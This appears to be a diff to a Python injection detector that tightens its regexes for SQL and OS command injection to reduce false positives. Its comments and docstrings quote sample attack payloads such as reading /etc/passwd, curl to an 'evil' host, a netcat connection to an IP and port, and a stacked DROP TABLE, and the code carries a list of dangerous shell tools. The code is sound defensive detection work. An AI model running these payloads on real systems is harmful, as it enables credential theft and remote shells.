@@ -1833,12 +1833,24 @@ def policy_path_oracle(observed_policy: Any) -> OracleSignal:
 _SQL_TAUT_RE = re.compile(
     r"""(?i)^(OR|AND|XOR)\b\s*\(?\s*['"]?([A-Za-z0-9_]+)['"]?\s*(?:=|<=>|\bLIKE\b)\s*['"]?([A-Za-z0-9_]+)['"]?""")
 _SQL_UNION_RE = re.compile(r"(?i)^UNION\b\s+(?:ALL\s+)?SELECT\b")
-_SQL_STACK_KW = ("SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE",
-                 "EXEC", "EXECUTE", "GRANT", "MERGE", "REPLACE")
-_SQL_STACK_RE = re.compile(r"(?i)^;\s*(?:" + "|".join(_SQL_STACK_KW) + r")\b")
-# A comment that terminates the query RIGHT AFTER the break-out (`admin'--`): `--` must be followed by
-# whitespace/EOL (a real SQL line comment), or a `/*` block. `O'--Brien` (no space after --) is inert.
-_SQL_COMMENT_RE = re.compile(r"^(?:--(?:\s|$)|/\*)")
+# A stacked statement must have a real STATEMENT SHAPE — the leading keyword AND its required
+# companion (SELECT..FROM, INSERT..INTO, DROP TABLE, ...). SELECT/UPDATE/DELETE/DROP are also ordinary
+# English verbs, so `; select the file` / `; delete the row` (benign UI/support prose) must NOT match;
+# requiring the second keyword is what separates a statement from a verb. `.{0,120}?` is lazy+bounded
+# (ReDoS-safe).
+_SQL_STACK_RE = re.compile(
+    r"(?is)^;\s*(?:"
+    r"SELECT\b.{0,120}?\bFROM\b"
+    r"|INSERT\b.{0,40}?\bINTO\b"
+    r"|UPDATE\b.{0,80}?\bSET\b"
+    r"|DELETE\b.{0,40}?\bFROM\b"
+    r"|DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER)\b"
+    r"|CREATE\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER|PROCEDURE)\b"
+    r"|ALTER\s+(?:TABLE|DATABASE|USER|SCHEMA)\b"
+    r"|TRUNCATE\s+TABLE\b"
+    r"|GRANT\b.{0,80}?\bTO\b"
+    r"|EXEC(?:UTE)?\b\s+\w"
+    r")")
 
 
 def _sql_breakout_tails(text: str, quote: str):
@@ -1861,9 +1873,12 @@ def _sql_breakout_tails(text: str, quote: str):
 
 def _sql_structure_at_start(tail: str) -> str:
     """The SQL structure PROVEN present at the START of a break-out tail, or "" — the near-zero-FP
-    proofs: a boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, a stacked
-    `; <statement keyword>`, or a query-terminating comment (`--`/`/*`) — each ANCHORED immediately
-    after the break-out (leading whitespace/parens skipped). Prose after an apostrophe never matches."""
+    proofs, each ANCHORED immediately after the break-out (leading whitespace/parens skipped): a
+    boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, or a stacked statement
+    with a full statement shape (`; DROP TABLE`, `; SELECT .. FROM`). A lone comment (`--`/`/*`) is
+    DELIBERATELY not a proof — `'Inception' -- best film`, pasted code comments, and prose em-dashes
+    after a quoted word produce it, so it was a false positive; an attacker's comment almost always
+    follows a tautology/UNION we already catch. Prose after an apostrophe never matches."""
     s = tail.lstrip().lstrip("()").lstrip()
     if not s:
         return ""
@@ -1874,8 +1889,6 @@ def _sql_structure_at_start(tail: str) -> str:
         return "UNION SELECT"
     if _SQL_STACK_RE.match(s):
         return "stacked statement"
-    if _SQL_COMMENT_RE.match(s):
-        return "comment-terminated"
     return ""
 
 
@@ -1910,8 +1923,10 @@ def sql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSig
 
 # Dangerous command binaries. A BARE command name is NOT a proof — ordinary prose, jQuery `$(id)`,
 # and markdown `` `code` `` all contain command-like words — so a fire additionally REQUIRES a
-# shell-ARGUMENT indicator (an absolute/relative path, a `-flag`, a redirect/pipe, a URL, or an IP)
-# next to the command, which prose/jQuery/markdown do not carry. This is what makes it near-zero-FP.
+# shell-ARGUMENT indicator (a SYSTEM path, `./`/`../`, a `-flag`, a URL, or an IPv4) next to the
+# command. Comparison operators (`>`/`|`) and version slashes (`tool/1.2.3`) are DELIBERATELY excluded:
+# `id > 1000` and `python-requests/2.25.1` are benign, and treating them as shell args was a false
+# positive.
 _SHELL_CMDS = ("cat", "ls", "id", "whoami", "uname", "nc", "ncat", "netcat", "curl", "wget", "bash",
                "sh", "zsh", "ksh", "powershell", "pwsh", "nslookup", "dig", "cmd", "python", "python3",
                "perl", "ruby", "php", "chmod", "chown", "mkfifo", "telnet", "socat", "base64", "xxd",
@@ -1922,19 +1937,26 @@ _SHELL_CMD_AT_START_RE = re.compile(r"(?i)^(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
 # A command SUBSTITUTION body: $(...) or `...`. The bounded, negated char classes are LINEAR (no
 # backtracking), so this is ReDoS-safe on adversarial input.
 _SHELL_SUBST_RE = re.compile(r"\$\(([^)]{1,300})\)|`([^`]{1,300})`")
-# A shell-ARGUMENT indicator: a path (/etc, ./x), a -flag, a redirect/pipe, a URL, or an IPv4. jQuery
-# selectors, markdown code spans, and delimited prose do not pair a dangerous command WITH one of these.
-_SHELL_ARG_RE = re.compile(r"""(?i)(?:/[a-z0-9._~]|(?<=\s)-[a-z]|[|>]|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)""")
+# A shell-ARGUMENT indicator — restricted to unambiguous shell shapes: a FILESYSTEM path (a leading
+# `/` into a known system dir, or `./`/`../`), a `-flag`, a URL, or an IPv4. A bare `>`/`|` (a
+# comparison/pipe in prose) and a `tool/version` slash are NOT indicators.
+_SHELL_SYS_DIRS = ("etc", "bin", "usr", "tmp", "var", "dev", "proc", "root", "sys", "opt", "home",
+                   "sbin", "lib", "lib64", "mnt", "srv", "boot", "run", "media")
+_SHELL_ARG_RE = re.compile(
+    r"(?i)(?:/(?:" + "|".join(_SHELL_SYS_DIRS) + r")\b|\.\.?/|(?<=\s)-[a-z]{1,3}\b"
+    r"|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)")
 
 
 def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
     """Fire iff `payload` contains an OS-command-execution construct PROVEN by a dangerous command
     invoked WITH a shell argument — inside a command substitution (`$(cat /etc/passwd)`, `` `curl
-    http://evil/x` ``), or after a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
-    Conservative for near-zero FP: the shell-argument requirement means `$(id)` / `` `code` `` /
-    `dog|cat` / `Name | Age | ID` / `eat; sleep; repeat` / `; cat food` do NOT fire (a bare command
-    name in prose/jQuery/markdown is not a proof). Splitting on separators (not a class-vs-\\s* regex)
-    keeps it ReDoS-safe. Pure/deterministic; proves an ATTEMPT, never exploitation."""
+    http://evil/x` ``), or AFTER a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
+    Conservative for near-zero FP: (a) a bare command name is not a proof, so a shell argument is
+    required; (b) the separator branch SKIPS the first segment (a value that merely BEGINS with a
+    command word — `python-requests/2.25.1`, `id > 1000` — had no preceding separator and is benign);
+    (c) `>`/`|` and `tool/version` slashes are not arguments. So `$(id)` / `` `code` `` / `dog|cat` /
+    `Name | Age | ID` / `id > 1000` / `python-requests/2.25.1` do NOT fire. ReDoS-safe (split on the
+    separator class). Pure/deterministic; proves an ATTEMPT, never exploitation."""
     kind = OracleKind.COMMAND_INJECTION_BREAKOUT
     text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
     if len(text) < 4:
@@ -1942,8 +1964,8 @@ def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> Oracl
                             evidence="too short to carry a command-execution construct",
                             observed={"param": param})
     # (1) command substitution wrapping a dangerous command WITH an argument. `$(...)` / backticks are
-    # already a strong shell signal, so a whitespace-separated argument suffices — `$(id)` / `` `code` ``
-    # / `$(document)` (bare name or non-command) do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
+    # already a strong shell signal, so a whitespace-separated argument also suffices — `$(id)` /
+    # `` `code` `` / `$(document)` do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
     for m in _SHELL_SUBST_RE.finditer(text):
         body = m.group(1) or m.group(2) or ""
         cmd = _SHELL_CMD_RE.search(body)
@@ -1954,8 +1976,9 @@ def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> Oracl
                           f"a structured OS command injection attempt"),
                 observed={"param": param, "construct": "substitution", "command": cmd.group(1).lower()})
     # (2) a command SEPARATOR then a dangerous command WITH a shell argument. Split on the separator
-    #     class (linear, no backtracking) and inspect each following segment.
-    for seg in re.split(r"[;|&\n\r]", text):
+    #     class (linear, no backtracking) and inspect each segment AFTER a real separator — segment[0]
+    #     had NO preceding separator, so a value that merely starts with a command word is not a proof.
+    for seg in re.split(r"[;|&\n\r]", text)[1:]:
         seg = seg.strip()
         cmd = _SHELL_CMD_AT_START_RE.match(seg)
         if cmd and _SHELL_ARG_RE.search(seg[cmd.end():]):
